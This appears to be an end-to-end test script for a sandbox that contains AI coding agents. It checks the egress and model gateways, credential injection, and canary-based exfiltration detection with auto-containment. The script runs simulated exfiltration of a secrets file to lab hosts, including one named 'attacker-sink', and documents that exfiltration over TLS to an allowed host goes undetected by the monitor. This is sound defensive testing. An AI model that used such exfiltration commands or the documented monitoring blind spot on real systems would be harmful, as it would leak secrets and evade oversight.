#!/usr/bin/env bash
# M2 end-to-end: a gVisor sandbox pod with only a placeholder token uses the AI and egress
# gateways; credproxy injects the real key. Verifies enforcement and evidence from outside
# the sandbox (gateway evidence log + lab receipts). The session is registered directly via
# the control plane's internal API (lifecycle/CLI arrives in M3).
set -uo pipefail
cd "$(dirname "$0")/.."
SID="m2$(openssl rand -hex 3)"
TOKEN="sbx_${SID}_$(openssl rand -hex 32)"
CANARY="FGCANARY-${SID}-$(openssl rand -hex 6)"
POD="sandbox-$SID"
CP="http://127.0.0.1:8443"
IKEY="$(kubectl -n sbx-system get secret sbx-internal -o jsonpath='{.data.key}' | base64 -d)"
pass=0; fail=0
check() { if [ "$2" = "$3" ]; then echo "PASS  $1 (got $3)"; pass=$((pass+1)); else echo "FAIL  $1 (expected $2, got $3)"; fail=$((fail+1)); fi; }
cleanup() { kubectl -n sbx-sessions delete pod "$POD" --wait=false >/dev/null 2>&1; }
trap cleanup EXIT

kubectl apply -f - >/dev/null <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: $POD
  namespace: sbx-sessions
  labels: { sbx/session: $SID, sbx/state: running }
spec:
  runtimeClassName: gvisor
  automountServiceAccountToken: false
  enableServiceLinks: false
  dnsPolicy: None
  dnsConfig: { nameservers: ["127.0.0.1"] }
  hostAliases: [{ ip: 10.96.100.10, hostnames: [gateway] }]
  securityContext: { runAsNonRoot: true, runAsUser: 1000, seccompProfile: { type: RuntimeDefault } }
  containers:
  - name: agent
    image: sbx/sandbox:dev
    imagePullPolicy: Never
    command: ["sleep", "1800"]
    env:
    - { name: HOME, value: /home/agent }
    - { name: ANTHROPIC_BASE_URL, value: "http://gateway:8080" }
    - { name: ANTHROPIC_API_KEY, value: "$TOKEN" }
    - { name: HTTP_PROXY, value: "http://$SID:$TOKEN@gateway:3128" }
    - { name: HTTPS_PROXY, value: "http://$SID:$TOKEN@gateway:3128" }
    - { name: NO_PROXY, value: "gateway" }
    - { name: http_proxy, value: "http://$SID:$TOKEN@gateway:3128" }    # curl ignores upper-case HTTP_PROXY (httpoxy)
    - { name: https_proxy, value: "http://$SID:$TOKEN@gateway:3128" }
    - { name: no_proxy, value: "gateway" }
    - { name: ANTHROPIC_MODEL, value: claude-sonnet-5-5 }
    - { name: ANTHROPIC_SMALL_FAST_MODEL, value: claude-haiku-5-5 }
    - { name: ANTHROPIC_DEFAULT_HAIKU_MODEL, value: claude-haiku-5-5 }
    - { name: CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC, value: "1" }
    - { name: DISABLE_AUTOUPDATER, value: "1" }
    securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: [ALL] } }
    volumeMounts: [{ name: home, mountPath: /home/agent }, { name: ws, mountPath: /workspace }, { name: tmp, mountPath: /tmp }]
  volumes: [{ name: home, emptyDir: {} }, { name: ws, emptyDir: {} }, { name: tmp, emptyDir: {} }]
EOF
kubectl -n sbx-sessions wait --for=condition=Ready "pod/$POD" --timeout=120s >/dev/null
POD_IP=$(kubectl -n sbx-sessions get pod "$POD" -o jsonpath='{.status.podIP}')
kubectl -n sbx-sessions exec "$POD" -- sh -c "printf 'PAYMENTS_API_KEY=%s\n' '$CANARY' > /workspace/.env"

curl -sf -X POST "$CP/internal/sessions" -H "X-Sbx-Internal: $IKEY" -H 'content-type: application/json' -d @- >/dev/null <<EOF
{"session_id":"$SID","user":"$(whoami)","spec_name":"bugfix-agent@dev","spec_digest":"sha256:dev",
 "token":"$TOKEN","pod_ip":"$POD_IP","pod_name":"$POD",
 "policy":{"egress_allow":["paste-mock.lab-ext"],"model_allow":["claude-sonnet-5-5","claude-haiku-5-5"],
           "max_tokens":2000000,"grants":["anthropic/default"]},
 "canaries":[{"id":"c1","value":"$CANARY"}]}
EOF
echo "session $SID registered (pod $POD_IP)"
sb() { kubectl -n sbx-sessions exec "$POD" -- "$@" 2>/dev/null; }
code() { sb curl -s -o /dev/null -m 10 -w '%{http_code}' "$@" || true; }
for _ in $(seq 1 20); do [ "$(code http://paste-mock.lab-ext/ping)" = 200 ] && break; sleep 1; done

# Order matters now that the M4 detector is live: an HTTP canary send triggers D1 auto-containment,
# so functional checks run first, the (undetectable) TLS canary next, and the HTTP canary last.
echo "--- egress gateway"
check "allowed host, benign POST"         200 "$(code -X POST --data 'hello' http://paste-mock.lab-ext/upload)"
check "non-allowlisted host (B2)"         403 "$(code -X POST --data 'hello' http://attacker-sink.lab-ext/upload)"
check "no proxy creds"                    407 "$(sb curl -s -o /dev/null -m 5 -w '%{http_code}' --noproxy '' -x http://gateway:3128 http://paste-mock.lab-ext/ || true)"
check "sandbox env has no real key"       0   "$(sb sh -c 'env; cat /workspace/.env' | grep -c 'sk-ant-')"

echo "--- AI gateway"
check "disallowed model (B8)" 403 "$(code -X POST http://gateway:8080/v1/messages -H "x-api-key: $TOKEN" \
  -H 'anthropic-version: 2023-06-01' -H 'content-type: application/json' \
  -d '{"model":"claude-opus-5-5","max_tokens":16,"messages":[{"role":"user","content":"hi"}]}')"
out=$(kubectl -n sbx-sessions exec "$POD" -- sh -c 'cd /workspace && timeout 180 claude -p "Use the Bash tool to run exactly: echo sbx-tool-ok. Then reply with only the command output." --model claude-sonnet-5-5 --allowedTools "Bash(echo:*)" 2>&1' || true)
check "claude -p via gateway (real key injected upstream)" 1 "$(echo "$out" | grep -c 'sbx-tool-ok' | awk '{print ($1>0)?1:0}')"

echo "--- canary exfil"
check "allowed host over TLS, canary (B10: allowed, undetected)" 200 "$(code -k -X POST --data-binary @/workspace/.env https://paste-mock.lab-ext.svc/upload)"
sleep 3
check "still running after TLS canary (blind spot)" 200 "$(code -X POST --data 'hello' http://paste-mock.lab-ext/upload)"
check "allowed host, canary over HTTP (B9: allowed, detected)" 200 "$(code -X POST --data-binary @/workspace/.env http://paste-mock.lab-ext/upload)"

echo "--- after D1 auto-containment"
for _ in $(seq 1 30); do [ "$(code -m 3 -X POST --data 'x' http://paste-mock.lab-ext/upload)" = 000 ] && break; sleep 1; done
check "egress after containment (quarantined)"  000 "$(code -m 4 -X POST --data 'x' http://paste-mock.lab-ext/upload)"
check "AI after containment (quarantined)"      000 "$(code -m 4 -X POST http://gateway:8080/v1/messages -H "x-api-key: $TOKEN" -H 'content-type: application/json' -d '{}')"

echo "--- evidence (outside the sandbox)"
EV=$(kubectl -n sbx-system exec deploy/gateway -- cat /evidence/gateway.jsonl | grep "\"$SID\"")
j() { echo "$EV" | python3 -c "import json,sys; ev=[json.loads(l) for l in sys.stdin if l.strip()]; print($1)"; }
check "D1 signal: canary over HTTP to allowed host"  1 "$(j "sum(1 for e in ev if e['action']=='egress_http' and (e.get('canary_match') or {}).get('id')=='c1')")"
check "denial to attacker-sink recorded"             1 "$(j "sum(1 for e in ev if e['action']=='egress_deny' and e['dest_host']=='attacker-sink.lab-ext')")"
check "TLS tunnel: allowed, no canary visibility"    1 "$(j "sum(1 for e in ev if e['action']=='egress_connect' and e['decision']=='allow' and e['dest_host']=='paste-mock.lab-ext')")"
check "model denial recorded"                        1 "$(j "min(1,sum(1 for e in ev if e['action']=='ai_request' and e.get('reason')=='model_not_allowed'))")"
check "tool_use parsed from model stream (D3 input)" 1 "$(j "min(1,sum(1 for e in ev if e['action']=='ai_tool_use' and 'sbx-tool-ok' in e.get('input','')))")"
check "hash chain verifies" True "$(kubectl -n sbx-system exec deploy/gateway -- python -c 'from sbx.common.evidence import verify_chain; print(verify_chain("/evidence/gateway.jsonl")[0])')"

echo "--- ground truth (lab receipts)"
REC=$(kubectl -n lab-ext logs deploy/paste-mock; kubectl -n lab-ext logs deploy/attacker-sink)
B64=$(printf '%s' "$CANARY" | base64)
check "canary reached paste-mock (exfil via allowed destination)" yes "$(echo "$REC" | grep '"sink": "paste-mock"' | grep -q "$(printf 'PAYMENTS_API_KEY=%s\n' "$CANARY" | base64)" && echo yes || echo no)"
check "canary never reached attacker-sink" 0 "$(echo "$REC" | grep '"sink": "attacker-sink"' | grep -c "${B64:0:16}")"

echo; echo "passed=$pass failed=$fail"
[ "$fail" = 0 ]
